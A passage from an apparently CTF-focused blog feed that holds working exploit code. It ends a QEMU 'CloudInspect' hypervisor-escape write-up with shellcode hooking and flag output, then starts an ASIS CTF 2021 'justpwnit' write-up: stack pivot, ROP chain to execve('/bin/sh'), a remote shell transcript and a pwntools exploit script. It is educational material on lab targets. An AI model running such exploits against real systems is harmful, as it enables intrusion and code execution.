<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_DST</span><span class="p">,</span> <span class="n">dmabuf_phys_addr</span><span class="p">);</span>
<span class="n">ioread</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_TRIGGER</span><span class="p">);</span>

<span class="c1">// Write it in the fake struct
</span><span class="c1"></span><span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">fake_ops</span><span class="p">,</span> <span class="n">dmabuf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">MemoryRegionOps</span><span class="p">));</span>
<span class="n">fake_ops</span><span class="p">.</span><span class="n">read</span> <span class="o">=</span> <span class="p">(</span><span class="n">leak_rwx</span> <span class="o">+</span> <span class="mh">0x1000</span><span class="p">);</span> 
<span class="c1">// Edit the handler we want to hook to make it point to the shellcode at leak_rwx + 0x1000
</span><span class="c1"></span>
<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] fake_ops.read = %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">leak_rwx</span> <span class="o">+</span> <span class="mh">0x1000</span><span class="p">);</span>
<span class="n">memcpy</span><span class="p">(</span><span class="n">dmabuf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">fake_ops</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">MemoryRegionOps</span><span class="p">));</span>

<span class="c1">// patch it and write it @ leak_rwx + 0x2000
</span><span class="c1"></span><span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_CMD</span><span class="p">,</span> <span class="n">CLOUDINSPECT_DMA_PUT_VALUE</span><span class="p">);</span>
<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_DST</span><span class="p">,</span> <span class="n">leak_rwx</span> <span class="o">-</span> <span class="n">addr_obj</span> <span class="o">+</span> <span class="mh">0x2000</span><span class="p">);</span>
<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_CNT</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">MemoryRegionOps</span><span class="p">));</span>
<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_SRC</span><span class="p">,</span> <span class="n">dmabuf_phys_addr</span><span class="p">);</span>
<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_TRIGGER</span><span class="p">,</span> <span class="mh">0x300</span><span class="p">);</span>
</code></pre></div><div class="gblog-post__anchorwrap">
    <h3 id="hook-mmioops--profit">
        Hook mmio.ops + PROFIT
        <a data-clipboard-text="https://nasm.re/posts/cloudinspect/#hook-mmioops--profit" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Hook mmio.ops &#43; PROFIT" href="#hook-mmioops--profit">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h3>
</div>
<p>We just have to replace the original <code>CoudInspect.mmio.ops</code> pointer to a pointer to the <code>fake_ops</code> structure.
Then, next time we send a read request, the shellcode will be executed! And we will just need to retablish the original <code>CoudInspect.mmio.ops</code> pointer to read the flag at <code>leak_rwx+0x5000</code>! Which gives:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="n">write_dmabuf</span><span class="p">(</span><span class="o">-</span><span class="mh">0xd0</span><span class="p">,</span> <span class="n">leak_rwx</span><span class="o">+</span><span class="mh">0x2000</span><span class="p">);</span>
<span class="c1">// Set the pointer to the MemoryRegionOps to the fake MemoryRegionOps	
</span><span class="c1"></span>
<span class="n">ioread</span><span class="p">(</span><span class="mh">0x37</span><span class="p">);</span> <span class="c1">// trigger the read handler we control, then the shellcode is 
</span><span class="c1">// executed and the flag is written @ leak_rwx + 0x5000[enter link description here](cloudinspect)
</span><span class="c1"></span>
<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] CloudInspectState.mmio.ops.read () =&gt; jmp @ %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">leak_rwx</span> <span class="o">+</span> <span class="mh">0x1000</span><span class="p">);</span>

<span class="kt">char</span> <span class="n">flag</span><span class="p">[</span><span class="mh">0x30</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
<span class="c1">// So we just have to read the flag @ leak_rwx + 0x5000
</span><span class="c1"></span>
<span class="n">write_dmabuf</span><span class="p">(</span><span class="o">-</span><span class="mh">0xd0</span><span class="p">,</span> <span class="n">ops_struct</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] CloudInspectState.mmio.ops = original ops</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] Reading the flag @ %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">leak_rwx</span> <span class="o">+</span> <span class="mh">0x5000</span><span class="p">);</span>
<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_CMD</span><span class="p">,</span> <span class="n">CLOUDINSPECT_DMA_PUT_VALUE</span><span class="p">);</span>
<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_SRC</span><span class="p">,</span> <span class="n">leak_rwx</span> <span class="o">-</span> <span class="n">addr_obj</span> <span class="o">+</span> <span class="mh">0x5000</span><span class="p">);</span>
<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_CNT</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">);</span>
<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_DST</span><span class="p">,</span> <span class="n">dmabuf_phys_addr</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ioread</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_TRIGGER</span><span class="p">))</span> <span class="p">{</span>
		<span class="n">perror</span><span class="p">(</span><span class="s">&#34;Failed to read the flag</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
		<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">memcpy</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="n">dmabuf</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">&#34;flag: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">flag</span><span class="p">);</span>


<span class="c1">// adresses are different because here is another execution on the remote challenge
</span><span class="c1"></span><span class="cm">/*
</span><span class="cm">b&#39;[*] CloudInspectState.mmio.ops.read () =&gt; jmp @ 7fe3dc001000\r\r\n&#39;
</span><span class="cm">b&#39;[*] CloudInspectState.mmio.ops = original ops\r\r\n&#39;
</span><span class="cm">b&#39;[*] Reading the flag @ 7fe3dc005000\r\r\n&#39;
</span><span class="cm">b&#39;flag: flag{cloudinspect_inspects_your_cloud_0107}\r\r\n&#39;
</span><span class="cm">
</span><span class="cm">flag: flag{cloudinspect_inspects_your_cloud_0107}
</span><span class="cm">*/</span>
</code></pre></div><p>Thanks for the organizers for this awesome event! The other pwn challenges look like very interesting as well!
You can the final exploit <a
  class="gblog-markdown__link"
  href="https://github.com/ret2school/ctf/blob/master/2021/hack.lu/pwn/cloudinspect/remote.c"
  
  >here</a
>.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="resources">
        Resources
        <a data-clipboard-text="https://nasm.re/posts/cloudinspect/#resources" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Resources" href="#resources">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<ul>
<li><a
  class="gblog-markdown__link"
  href="https://tldp.org/LDP/tlk/dd/pci.html"
  
  >Interesting article about PCI devices</a
></li>
<li><a
  class="gblog-markdown__link"
  href="https://www.kernel.org/doc/Documentation/filesystems/sysfs-pci.txt"
  
  >Linux kernel PCI documentation</a
></li>
<li><a
  class="gblog-markdown__link"
  href="https://www.kernel.org/doc/Documentation/vm/pagemap.txt"
  
  >Linux kernel pagemap documentation</a
></li>
</ul>
]]></content>
            
                 
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://nasm.re/tags/ctf" term="ctf" label="ctf" />
                             
                                <category scheme="https://nasm.re/tags/ret2school" term="ret2school" label="ret2school" />
                             
                                <category scheme="https://nasm.re/tags/hack.lu" term="hack.lu" label="hack.lu" />
                             
                                <category scheme="https://nasm.re/tags/nasm" term="nasm" label="nasm" />
                             
                                <category scheme="https://nasm.re/tags/pwn" term="pwn" label="pwn" />
                             
                                <category scheme="https://nasm.re/tags/heap" term="heap" label="heap" />
                             
                                <category scheme="https://nasm.re/tags/arbitrary-read" term="arbitrary-read" label="arbitrary read" />
                             
                                <category scheme="https://nasm.re/tags/arbitrary-write" term="arbitrary-write" label="arbitrary write" />
                             
                                <category scheme="https://nasm.re/tags/hypervisor" term="hypervisor" label="hypervisor" />
                             
                                <category scheme="https://nasm.re/tags/qemu" term="qemu" label="qemu" />
                             
                                <category scheme="https://nasm.re/tags/2021" term="2021" label="2021" />
                            
                        
                    
                
            
        </entry>
    
        
        <entry>
            <title type="html"><![CDATA[[ASIS CTF QUALS 2021 - pwn] abbr & justpwnit]]></title>
            <link href="https://nasm.re/posts/pwnasis/?utm_source=atom_feed" rel="alternate" type="text/html"  hreflang="en" />
            <id>https://nasm.re/posts/pwnasis/</id>
            
            <published>2021-10-24T00:00:00+00:00</published>
            <updated>2021-10-24T00:00:00+00:00</updated>
            
            
            <content type="html"><![CDATA[<p>Hello folks ! Here is a write up for the two first pwn challenges of the ASIS CTF.
You can find the related files <a
  class="gblog-markdown__link"
  href="https://github.com/ret2school/ctf/blob/master/2021/asisctf"
  
  >here</a
>.</p>
<div class="gblog-post__anchorwrap">
    <h1 id="justpwnit">
        justpwnit
        <a data-clipboard-text="https://nasm.re/posts/pwnasis/#justpwnit" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor justpwnit" href="#justpwnit">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h1>
</div>
<p>justpwnit was a warmup pwn challenge. That&rsquo;s only a basic stack overflow.
The binary is statically linked and here is the checksec&rsquo;s output:</p>
<pre tabindex="0"><code>[*] '/home/nasm/justpwnit'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre><p>Morever the source code is provided as it is the case for all the pwn tasks !
Here it is:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cm">/*
</span><span class="cm"> * musl-gcc main.c -o chall -no-pie -fno-stack-protector -O0 -static
</span><span class="cm"> */</span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="cp">#define STR_SIZE 0x80
</span><span class="cp"></span>
<span class="kt">void</span> <span class="nf">set_element</span><span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="n">parray</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">int</span> <span class="n">index</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Index: &#34;</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d%*c&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">index</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">parray</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">calloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">),</span> <span class="n">STR_SIZE</span><span class="p">)))</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Data: &#34;</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">fgets</span><span class="p">(</span><span class="n">parray</span><span class="p">[</span><span class="n">index</span><span class="p">],</span> <span class="n">STR_SIZE</span><span class="p">,</span> <span class="n">stdin</span><span class="p">))</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">justpwnit</span><span class="p">()</span> <span class="p">{</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">array</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">set_element</span><span class="p">(</span><span class="n">array</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">alarm</span><span class="p">(</span><span class="mi">180</span><span class="p">);</span>
  <span class="n">justpwnit</span><span class="p">();</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p>The program is basically reading <code>STR_SIZE</code> bytes into <code>parray[index]</code>, the issue is that there is no check on the user controlled index from which we choose were write the input.
Furthermore, <code>index</code> is a signed integer, which means we can input a negative value. If we do so we will be able to overwrite the saved <code>$rbp</code> value of the <code>set_element</code> stackframe by a heap pointer to our input. By this way at the end of the pwninit, the <code>leave</code> instruction will pivot the stack from the original state to a pointer to the user input.</p>
<p>Let&rsquo;s see this in gdb !</p>
<pre tabindex="0"><code>00:0000│ rsp     0x7ffef03864e0 ◂— 0x0                                                                                                                                                         
01:0008│         0x7ffef03864e8 —▸ 0x7ffef0386520 ◂— 0xb4                                                                                                                                      
02:0010│         0x7ffef03864f0 ◂— 0x0
03:0018│         0x7ffef03864f8 ◂— 0xfffffffe00403d3f /* '?=@' */
04:0020│         0x7ffef0386500 ◂— 0x0
05:0028│         0x7ffef0386508 —▸ 0x40123d (main) ◂— endbr64 
06:0030│ rbx rbp 0x7ffef0386510 —▸ 0x7ffef0386550 —▸ 0x7ffef0386560 ◂— 0x1
07:0038│         0x7ffef0386518 —▸ 0x40122f (justpwnit+33) ◂— add    dword ptr [rbp - 4], 1
08:0040│ rax     0x7ffef0386520 ◂— 0xb4
09:0048│         0x7ffef0386528 ◂— 0x0
... ↓            4 skipped
0e:0070│         0x7ffef0386550 —▸ 0x7ffef0386560 ◂— 0x1
0f:0078│         0x7ffef0386558 —▸ 0x401295 (main+88) ◂— mov    eax, 0
</code></pre><p>That&rsquo;s the stack&rsquo;s state when we are calling calloc. We can see the <code>set_element</code>&rsquo;s stackframe which ends up in <code>$rsp+38</code> with the saved return address. And right after we see that <code>$rax</code> contains the address of the <code>parray</code> buffer. Which means that if we send -2 as index, <code>$rbp</code> will point to the newly allocated buffer to which we will write right after with <code>fgets</code>.</p>
<p>Then, if we do so, the stack&rsquo;s state looks like this:</p>
<pre tabindex="0"><code>00:0000│ rsp     0x7ffef03864e0 ◂— 0x0                                                                                                                                                         
01:0008│         0x7ffef03864e8 —▸ 0x7ffef0386520 ◂— 0xb4                                                                                                                                      
02:0010│         0x7ffef03864f0 ◂— 0x0                                                                                                                                                         
03:0018│         0x7ffef03864f8 ◂— 0xfffffffe00403d3f /* '?=@' */                                                                                                                              
04:0020│         0x7ffef0386500 ◂— 0x0                                                                                                                                                         
05:0028│         0x7ffef0386508 —▸ 0x40123d (main) ◂— endbr64                                                                                                                                  
06:0030│ rbx rbp 0x7ffef0386510 —▸ 0x7f2e4aea1050 ◂— 0x0                                                                                                                                       
07:0038│         0x7ffef0386518 —▸ 0x40122f (justpwnit+33) ◂— add    dword ptr [rbp - 4], 1                                                                                                    
08:0040│         0x7ffef0386520 ◂— 0xb4                                                                                                                                                        
09:0048│         0x7ffef0386528 ◂— 0x0                                                                                                                                                         
... ↓            4 skipped                                                                                                                                                                     
0e:0070│         0x7ffef0386550 —▸ 0x7ffef0386560 ◂— 0x1                                                                                                                                       
0f:0078│         0x7ffef0386558 —▸ 0x401295 (main+88) ◂— mov    eax, 0                                                                                                                         
</code></pre><p>The saved <code>$rbp</code> has been overwritten with a pointer to the user input. Then, at the end of the <code>set_element</code> function, <code>$rbp</code> is popped from the stack and contains a pointer to the user input. Which causes at the end of the <code>justpwnit</code> function, the <code>leave</code> instruction moves the pointer to the user input in <code>$rsp</code>.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="ropchain">
        ROPchain
        <a data-clipboard-text="https://nasm.re/posts/pwnasis/#ropchain" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor ROPchain" href="#ropchain">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>Once we can pivot the stack to makes it point to some user controlled areas, we just have to rop through all the gadgets we can find in the binary.
The binary is statically linked, and there is no system function in the binary, so we can&rsquo;t make a ret2system, we have to make a <code>execve(&quot;/bin/sh\0&quot;, NULL, NULL)</code>.</p>
<p>And so what we need is:</p>
<ul>
<li>pop rdi gadget</li>
<li>pop rsi gadget</li>
<li>pop rdx gadget</li>
<li>pop rax gadget</li>
<li>syscall gadget</li>
<li>mov qword ptr [reg], reg [to write &ldquo;/bin/sh\0&rdquo;] in a writable area</li>
</ul>
<p>We can easily find these gadgets with the help <a
  class="gblog-markdown__link"
  href="https://github.com/JonathanSalwan/ROPgadget"
  
  >ROPgadget</a
>.
We got:</p>
<pre tabindex="0"><code>0x0000000000406c32 : mov qword ptr [rax], rsi ; ret
0x0000000000401001 : pop rax ; ret
0x00000000004019a3 : pop rsi ; ret
0x00000000004013e9 : syscall
0x0000000000403d23 : pop rdx ; ret
0x0000000000401b0d : pop rdi ; ret
</code></pre><p>Now we just have to craft the ropchain !</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">POP_RDI</span> <span class="o">=</span> <span class="mh">0x0000000000401b0d</span>
<span class="n">POP_RDX</span> <span class="o">=</span> <span class="mh">0x0000000000403d23</span>
<span class="n">SYSCALL</span> <span class="o">=</span> <span class="mh">0x00000000004013e9</span>
<span class="n">POP_RAX</span> <span class="o">=</span> <span class="mh">0x0000000000401001</span>
<span class="n">POP_RSI</span> <span class="o">=</span> <span class="mh">0x00000000004019a3</span>

<span class="n">MOV_RSI_PTR_RAX</span> <span class="o">=</span> <span class="mh">0x0000000000406c32</span>
<span class="n">PT_LOAD_W</span> <span class="o">=</span> <span class="mh">0x00000000040c240</span>

<span class="n">pld</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RSI</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RAX</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">PT_LOAD_W</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">MOV_RSI_PTR_RAX</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RAX</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x3b</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">PT_LOAD_W</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RSI</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RDX</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>
</code></pre></div><p>And we can enjoy the shell !</p>
<pre tabindex="0"><code>➜  justpwnit git:(master) ✗ python3 exploit.py HOST=168.119.108.148 PORT=11010
[*] '/home/nasm/pwn/asis2021/justpwnit/justpwnit'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 168.119.108.148 on port 11010: Done
[*] Switching to interactive mode
$ id
uid=999(pwn) gid=999(pwn) groups=999(pwn)
$ ls
chall
flag-69a1f60d8055c88ea27fed1ab926b2b6.txt
$ cat flag-69a1f60d8055c88ea27fed1ab926b2b6.txt
ASIS{p01nt_RSP_2_h34p!_RHP_1n5t34d_0f_RSP?}
</code></pre><div class="gblog-post__anchorwrap">
    <h2 id="full-exploit">
        Full exploit
        <a data-clipboard-text="https://nasm.re/posts/pwnasis/#full-exploit" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Full exploit" href="#full-exploit">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>

<span class="c1"># this exploit was generated via</span>
<span class="c1"># 1) pwntools</span>
<span class="c1"># 2) ctfinit</span>

<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">pwn</span>


<span class="c1"># Set up pwntools for the correct architecture</span>
<span class="n">exe</span>  <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;justpwnit&#39;</span><span class="p">)</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="kc">True</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">rename_corefiles</span> <span class="o">=</span> <span class="kc">False</span>

<span class="n">host</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">HOST</span>
<span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">PORT</span> <span class="ow">or</span> <span class="mi">1337</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">local</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">remote</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">io</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">local</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
<span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span><span class="s1">source /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/Downloads/pwndbg/gdbinit.py
</span><span class="s1">set follow-fork-mode parent
</span><span class="s1">b* main
</span><span class="s1">continue
</span><span class="s1">&#39;&#39;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>

<span class="c1">#===========================================================</span>
<span class="c1">#                    EXPLOIT GOES HERE</span>
<span class="c1">#===========================================================</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Index: &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;-2&#34;</span><span class="p">)</span>

<span class="c1"># 0x0000000000406c32 : mov qword ptr [rax], rsi ; ret</span>
<span class="c1"># 0x0000000000401001 : pop rax ; ret</span>
<span class="c1"># 0x00000000004019a3 : pop rsi ; ret</span>
<span class="c1"># 0x00000000004013e9 : syscall</span>
<span class="c1"># 0x0000000000403d23 : pop rdx ; ret</span>
<span class="c1"># 0x0000000000401b0d : pop rdi ; ret</span>

<span class="n">POP_RDI</span> <span class="o">=</span> <span class="mh">0x0000000000401b0d</span>
<span class="n">POP_RDX</span> <span class="o">=</span> <span class="mh">0x0000000000403d23</span>
<span class="n">SYSCALL</span> <span class="o">=</span> <span class="mh">0x00000000004013e9</span>
<span class="n">POP_RAX</span> <span class="o">=</span> <span class="mh">0x0000000000401001</span>
